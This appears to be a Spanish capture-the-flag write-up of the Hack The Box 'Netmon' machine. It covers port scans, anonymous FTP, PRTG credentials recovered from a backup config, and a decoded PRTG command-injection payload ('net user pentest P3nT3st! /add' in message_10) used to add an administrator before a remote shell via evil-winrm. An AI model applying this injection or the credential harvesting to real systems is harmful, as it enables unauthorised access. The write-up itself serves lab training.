-&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt;correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG openPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:18 GMT
-Initiating SYN Stealth Scan at 04:18
-Scanning 10.10.10.152 [65535 ports]
-Discovered open port 80/tcp on 10.10.10.152
-Discovered open port 21/tcp on 10.10.10.152
-Discovered open port 135/tcp on 10.10.10.152
-Discovered open port 139/tcp on 10.10.10.152
-Discovered open port 445/tcp on 10.10.10.152
-Discovered open port 49667/tcp on 10.10.10.152
-Discovered open port 49664/tcp on 10.10.10.152
-Discovered open port 49668/tcp on 10.10.10.152
-Discovered open port 47001/tcp on 10.10.10.152
-Discovered open port 49666/tcp on 10.10.10.152
-Discovered open port 49669/tcp on 10.10.10.152
-Discovered open port 5985/tcp on 10.10.10.152
-Discovered open port 49665/tcp on 10.10.10.152
-Completed SYN Stealth Scan at 04:18, 23.62s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.152
-Host is up, received user-set (0.14s latency).
-Scanned at 2023-06-14 04:18:22 GMT for 24s
-Not shown: 63185 closed tcp ports (reset), 2337 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT      STATE SERVICE      REASON
-21/tcp    open  ftp          syn-ack ttl 127
-80/tcp    open  http         syn-ack ttl 127
-135/tcp   open  msrpc        syn-ack ttl 127
-139/tcp   open  netbios-ssn  syn-ack ttl 127
-445/tcp   open  microsoft-ds syn-ack ttl 127
-5985/tcp  open  wsman        syn-ack ttl 127
-47001/tcp open  winrm        syn-ack ttl 127
-49664/tcp open  unknown      syn-ack ttl 127
-49665/tcp open  unknown      syn-ack ttl 127
-49666/tcp open  unknown      syn-ack ttl 127
-49667/tcp open  unknown      syn-ack ttl 127
-49668/tcp open  unknown      syn-ack ttl 127
-49669/tcp open  unknown      syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 23.76 seconds
-           Raw packets sent: 116389 (5.121MB) | Rcvd: 77893 (3.116MB)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 04:19 GMT
-Nmap scan report for 10.10.10.152
-Host is up (0.40s latency).
-
-PORT      STATE SERVICE      VERSION
-21/tcp    open  ftp          Microsoft ftpd
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| 02-03-19  12:18AM                 1024 .rnd
-| 02-25-19  10:15PM       &amp;lt;DIR&amp;gt;          inetpub
-| 07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
-| 02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          Program Files
-| 02-03-19  12:28AM       &amp;lt;DIR&amp;gt;          Program Files (x86)
-| 02-03-19  08:08AM       &amp;lt;DIR&amp;gt;          Users
-|_02-25-19  11:49PM       &amp;lt;DIR&amp;gt;          Windows
-| ftp-syst: 
-|_  SYST: Windows_NT
-80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
-|_http-server-header: PRTG/18.1.37.13946
-| http-title: Welcome | PRTG Network Monitor (NETMON)
-|_Requested resource was /index.htm
-|_http-trane-info: Problem with XML parsing of /evox/about
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49664/tcp open  msrpc        Microsoft Windows RPC
-49665/tcp open  msrpc        Microsoft Windows RPC
-49666/tcp open  msrpc        Microsoft Windows RPC
-49667/tcp open  msrpc        Microsoft Windows RPC
-49668/tcp open  msrpc        Microsoft Windows RPC
-49669/tcp open  msrpc        Microsoft Windows RPC
-Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb-security-mode: 
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2023-06-14T04:20:28
-|_  start_date: 2023-06-14T04:14:56
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 77.25 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;21&lt;/td&gt;
-      &lt;td&gt;FTP&lt;/td&gt;
-      &lt;td&gt;Microsoft ftpd&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;80&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;Indy httpd 18.1.37.13946&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;135&lt;/td&gt;
-      &lt;td&gt;RPC&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;139&lt;/td&gt;
-      &lt;td&gt;LDAP&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;445&lt;/td&gt;
-      &lt;td&gt;SMP&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows Server 2008 R2 - 2012 microsoft-ds&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;5985&lt;/td&gt;
-      &lt;td&gt;WINRM&lt;/td&gt;
-      &lt;td&gt;Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;47001&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;49664-49669&lt;/td&gt;
-      &lt;td&gt;MSRPC&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Comenzaremos enumerando el servicio &lt;code&gt;ftp&lt;/code&gt; haciendo uno del usuario &lt;code&gt;anonymous&lt;/code&gt;, sin proporcionar contraseña.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.152
-Connected to 10.10.10.152.
-220 Microsoft FTP Service
-Name (10.10.10.152:fmiracle): anonymous
-331 Anonymous access allowed, send identity (e-mail name) as password.
-Password:
-230 User logged in.
-Remote system type is Windows_NT.
-ftp&amp;gt; dir
-200 PORT command successful.
-125 Data connection already open; Transfer starting.
-02-03-19  12:18AM                 1024 .rnd
-02-25-19  10:15PM       &amp;lt;DIR&amp;gt;          inetpub
-07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
-02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          Program Files
-02-03-19  12:28AM       &amp;lt;DIR&amp;gt;          Program Files (x86)
-02-03-19  08:08AM       &amp;lt;DIR&amp;gt;          Users
-02-25-19  11:49PM       &amp;lt;DIR&amp;gt;          Windows
-226 Transfer complete.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si nos dirigimos al directorio &lt;code&gt;Users&lt;/code&gt;, vemos que podemos obtener la primera flag &lt;code&gt;user.txt&lt;/code&gt;, pero aun no tenemos acceso al sistema.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; cd Users
-250 CWD command successful.
-ftp&amp;gt; dir
-200 PORT command successful.
-125 Data connection already open; Transfer starting.
-02-25-19  11:44PM       &amp;lt;DIR&amp;gt;          Administrator
-02-03-19  12:35AM       &amp;lt;DIR&amp;gt;          Public
-226 Transfer complete.
-ftp&amp;gt; cd Public
-250 CWD command successful.
-ftp&amp;gt; dir
-200 PORT command successful.
-125 Data connection already open; Transfer starting.
-02-03-19  08:05AM       &amp;lt;DIR&amp;gt;          Documents
-07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Downloads
-07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Music
-07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Pictures
-06-14-23  12:15AM                   34 user.txt
-07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          Videos
-226 Transfer complete.
-ftp&amp;gt; get user.txt
-local: user.txt remote: user.txt
-200 PORT command successful.
-150 Opening ASCII mode data connection.
-226 Transfer complete.
-34 bytes received in 0.20 secs (0.1620 kB/s)
-ftp&amp;gt; exit
-221 Goodbye.
-❯ cat user.txt
-❯ c07be14afc2253b24510769dcb7db65
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para poder enumear de una manera mas comoda los archivos mediante &lt;code&gt;ftp&lt;/code&gt;, vamos a crearnos una montura con la herramienta &lt;code&gt;curlftpfs&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curlftpfs
-❯ mkdir /mnt/monturaftp
-❯ curlftpfs ftp://10.10.10.152 /mnt/monturaftp
-❯ ls -l /mnt/monturaftp
-d--------- root root   0 B  Sun Nov 20 22:46:00 2016  $RECYCLE.BIN
-d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Documents and Settings
-d--------- root root   0 B  Mon Feb 25 22:15:00 2019  inetpub
-d--------- root root   0 B  Sat Jul 16 09:18:00 2016  PerfLogs
-d--------- root root   0 B  Mon Feb 25 22:56:00 2019  Program Files
-d--------- root root   0 B  Sun Feb  3 00:28:00 2019  Program Files (x86)
-d--------- root root   0 B  Wed Dec 15 10:40:00 2021  ProgramData
-d--------- root root   0 B  Sun Feb  3 08:05:00 2019  Recovery
-d--------- root root   0 B  Sun Feb  3 08:04:00 2019  System Volume Information
-d--------- root root   0 B  Sun Feb  3 08:08:00 2019  Users
-d--------- root root   0 B  Mon Feb 25 23:49:00 2019  Windows
-.--------- root root 380 KB Sun Nov 20 21:59:00 2016  bootmgr
-.--------- root root   1 B  Sat Jul 16 09:10:00 2016  BOOTNXT
-.--------- root root 704 MB Wed Jun 14 00:14:00 2023  pagefile.sys
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Antes de segui enumerando vamos a ver el servicio web, que esta expuesto en el puerto 80.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que el servicio corresponde a &lt;code&gt;PRTG Network Monitor&lt;/code&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;PRTG Network Monitor: PRTG (Paessler Router Traffic Grapher hasta la versión 7) es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el  tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Buscamos si hay &lt;code&gt;exploits&lt;/code&gt; asociados a este servicio y entre ellos una de ejecución remota de comandos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit PRTG
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
- Exploit Title                                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                 | windows/webapps/46527.sh
-PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                | windows/webapps/49156.txt
-PRTG Network Monitor &amp;lt; 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                             | windows_x86/dos/44500.py
-PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                              | java/webapps/34108.txt
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
-Papers: No Results
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;El exploit nos pide estar autenticados, asi que vamos a examinar la montura que previamente creamos y trataremos de buscar archivos de configuración, ya que estos suelen almacenar credenciales.&lt;/p&gt;
-
-&lt;p&gt;Encontramos archivos de configuración, y usaremos &lt;code&gt;diff&lt;/code&gt; para encontrar diferncias entre el archivo &lt;code&gt;.dat&lt;/code&gt; y el archivo &lt;code&gt;old.bak&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;diff &quot;PRTG Configuration.dat&quot; &quot;PRTG Configuration.old.bak&quot; | less
-&amp;lt;               &amp;lt;flags&amp;gt;
-&amp;lt;                 &amp;lt;encrypted/&amp;gt;
-&amp;lt;               &amp;lt;/flags&amp;gt;
----
-&amp;gt;             &amp;lt;!-- User: prtgadmin --&amp;gt;
-&amp;gt;             PrTg@dmin2018
-317c313
-&amp;lt;                 77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q====
----
-&amp;gt;                 6SLJOGVBYWJF5ZMURQWHEPJ3C3WT2NQDJOZA====
-325c321
-&amp;lt;                 IVK3MVDI6HCMYIRYQN264YLIRXNJWMB6NT3Q====
----
-&amp;gt;                 ILD5YN3TROUJXG6ECLVDRKIPKTBKE274FTNQ====
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Obtenemos las credenciales &lt;code&gt;prtgadmin:PrTg@dmin2018&lt;/code&gt; con las cuales podamos logearnos en el servicio &lt;code&gt;PRTG&lt;/code&gt;, pero al intentar logearnos nos dicen que las credenciales son invalidas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos tratar de hacer guesing y debido a que la contraseña termina en 2018, podemos modificarla por 2019.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Logramos conectarnos al panel como el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Si revisamos el exploit que tenemos, vemos que este realiza una petición a la ruta &lt;code&gt;myaccount.htm?tabid=2&lt;/code&gt; y envia una data que se encuentra &lt;code&gt;urlencodeada&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Usaremos una sesión interactiva de &lt;code&gt;php&lt;/code&gt; para urldecodear la data y ver mejor que es lo que envia.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;❯ php --interactive
-Interactive mode enabled
-php &amp;gt; echo urldecode(&quot;name_=create_user&amp;amp;tags_=&amp;amp;active_=1&amp;amp;schedule_=-1%7CNone%7C&amp;amp;postpone_=1&amp;amp;comments=&amp;amp;summode_=2&amp;amp;summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&amp;amp;summinutes_=1&amp;amp;accessrights_=1&amp;amp;accessrights_=1&amp;amp;accessrights_201=0&amp;amp;active_1=0&amp;amp;addressuserid_1=-1&amp;amp;addressgroupid_1=-1&amp;amp;address_1=&amp;amp;subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;contenttype_1=text%2Fhtml&amp;amp;customtext_1=&amp;amp;priority_1=0&amp;amp;active_17=0&amp;amp;addressuserid_17=-1&amp;amp;addressgroupid_17=-1&amp;amp;message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_8=0&amp;amp;addressuserid_8=-1&amp;amp;addressgroupid_8=-1&amp;amp;address_8=&amp;amp;message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_2=0&amp;amp;eventlogfile_2=application&amp;amp;sender_2=PRTG+Network+Monitor&amp;amp;eventtype_2=error&amp;amp;message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_13=0&amp;amp;sysloghost_13=&amp;amp;syslogport_13=514&amp;amp;syslogfacility_13=1&amp;amp;syslogencoding_13=1&amp;amp;message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_14=0&amp;amp;snmphost_14=&amp;amp;snmpport_14=162&amp;amp;snmpcommunity_14=&amp;amp;snmptrapspec_14=0&amp;amp;messageid_14=0&amp;amp;message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;senderip_14=&amp;amp;active_9=0&amp;amp;url_9=&amp;amp;urlsniselect_9=0&amp;amp;urlsniname_9=&amp;amp;postdata_9=&amp;amp;active_10=0&amp;amp;active_10=10&amp;amp;address_10=Demo+EXE+Notification+-+OutFile.ps1&amp;amp;message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+user+pentest+P3nT3st!+%2Fadd%22&amp;amp;windowslogindomain_10=&amp;amp;windowsloginusername_10=&amp;amp;windowsloginpassword_10=&amp;amp;timeout_10=60&amp;amp;active_15=0&amp;amp;accesskeyid_15=&amp;amp;secretaccesskeyid_15=&amp;amp;arn_15=&amp;amp;subject_15=&amp;amp;message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&amp;amp;active_16=0&amp;amp;isusergroup_16=1&amp;amp;addressgroupid_16=200%7CPRTG+Administrators&amp;amp;ticketuserid_16=100%7CPRTG+System+Administrator&amp;amp;subject_16=%25device+%25name+%25status+%25down+(%25message)&amp;amp;message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&amp;amp;autoclose_16=1&amp;amp;objecttype=notification&amp;amp;id=new&amp;amp;targeturl=%2Fmyaccount.htm%3Ftabid%3D2&quot;);
-
-name_=create_user&amp;amp;tags_=&amp;amp;active_=1&amp;amp;schedule_=-1|None|&amp;amp;postpone_=1&amp;amp;comments=&amp;amp;summode_=2&amp;amp;summarysubject_=[%sitename] %summarycount Summarized Notifications&amp;amp;summinutes_=1&amp;amp;accessrights_=1&amp;amp;accessrights_=1&amp;amp;accessrights_201=0&amp;amp;active_1=0&amp;amp;addressuserid_1=-1&amp;amp;addressgroupid_1=-1&amp;amp;address_1=&amp;amp;subject_1=[%sitename] %device %name %status %down (%message)&amp;amp;contenttype_1=text/html&amp;amp;customtext_1=&amp;amp;priority_1=0&amp;amp;active_17=0&amp;amp;addressuserid_17=-1&amp;amp;addressgroupid_17=-1&amp;amp;message_17=[%sitename] %device %name %status %down (%message)&amp;amp;active_8=0&amp;amp;addressuserid_8=-1&amp;amp;addressgroupid_8=-1&amp;amp;address_8=&amp;amp;message_8=[%sitename] %device %name %status %down (%message)&amp;amp;active_2=0&amp;amp;eventlogfile_2=application&amp;amp;sender_2=PRTG Network Monitor&amp;amp;eventtype_2=error&amp;amp;message_2=[%sitename] %device %name %status %down (%message)&amp;amp;active_13=0&amp;amp;sysloghost_13=&amp;amp;syslogport_13=514&amp;amp;syslogfacility_13=1&amp;amp;syslogencoding_13=1&amp;amp;message_13=[%sitename] %device %name %status %down (%message)&amp;amp;active_14=0&amp;amp;snmphost_14=&amp;amp;snmpport_14=162&amp;amp;snmpcommunity_14=&amp;amp;snmptrapspec_14=0&amp;amp;messageid_14=0&amp;amp;message_14=[%sitename] %device %name %status %down (%message)&amp;amp;senderip_14=&amp;amp;active_9=0&amp;amp;url_9=&amp;amp;urlsniselect_9=0&amp;amp;urlsniname_9=&amp;amp;postdata_9=&amp;amp;active_10=0&amp;amp;active_10=10&amp;amp;address_10=Demo EXE Notification - OutFile.ps1&amp;amp;message_10=&quot;C:\Users\Public\tester.txt;net user pentest P3nT3st! /add&quot;&amp;amp;windowslogindomain_10=&amp;amp;windowsloginusername_10=&amp;amp;windowsloginpassword_10=&amp;amp;timeout_10=60&amp;amp;active_15=0&amp;amp;accesskeyid_15=&amp;amp;secretaccesskeyid_15=&amp;amp;arn_15=&amp;amp;subject_15=&amp;amp;message_15=[%sitename] %device %name %status %down (%message)&amp;amp;active_16=0&amp;amp;isusergroup_16=1&amp;amp;addressgroupid_16=200|PRTG Administrators&amp;amp;ticketuserid_16=100|PRTG System Administrator&amp;amp;subject_16=%device %name %status %down (%message)&amp;amp;message_16=Sensor: %name
-Status: %status %down
-
-&amp;amp;autoclose_16=1&amp;amp;objecttype=notification&amp;amp;id=new&amp;amp;targeturl=/myaccount.htm?tabid=2
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que la data se enviar a un parametro &lt;code&gt;message_10&lt;/code&gt;, en donde crea un usuario de nombre &lt;code&gt;pentest&lt;/code&gt; a nivel de sistema &lt;code&gt;net user pentest P3nT3st! /add&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Podemos aprovecharnos de este y ejecutar una instrucción similar a la del exploit, donde crearemos un usuario al cual pondre de nombre &lt;code&gt;pentest&lt;/code&gt; y ademas lo añadire al grupo de Administradores.&lt;/p&gt;
-
-&lt;p&gt;Nos dirigimos a la ruta a donde manda la petición, damos en &lt;code&gt;Add new Notification&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Creamos un nombre de Notificación, en este caso &lt;code&gt;Nuevo&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;y ahora activamos la función &lt;code&gt;Execute Program&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;podemos ver varios inputs y si los inspeccionamos encontramos el de &lt;code&gt;message_10&lt;/code&gt; que corresponde a &lt;code&gt;Parameter&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ejecutamos en el campo la instrucción, donde crearemos nuestro usuario y lo añadiremos al grupo administrador.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Guardamos y ahora en la notificación creada le damos en el simbolo de la campana &lt;code&gt;Send&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Le damos ok en la confirmación y ya deberia haberse ejecutado la acción.&lt;/p&gt;
-
-&lt;p&gt;Como vimos que el puerto &lt;code&gt;445&lt;/code&gt; esta abierto podemos usar &lt;code&gt;crackmapexec&lt;/code&gt; y validamos que el usuario &lt;code&gt;fmiracle&lt;/code&gt; ahora existe y forma parte de los usuarios &lt;code&gt;administradores&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
-SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
-SMB         10.10.10.152    445    NETMON           [+] netmon\pentest:p3nT3st! (Pwn3d!)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora haciendo uso del servicio de administración remota de windows, podemos conectarnos por el puerto &lt;code&gt;5985&lt;/code&gt;, usando la herramienta &lt;code&gt;evil-winrm&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
-
-Evil-WinRM shell v3.4
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\pentest\Documents&amp;gt; cd C:\Users
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez ya en el sistema podemos dirigirnos al directorio personal del usuario &lt;code&gt;Administrator&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
-
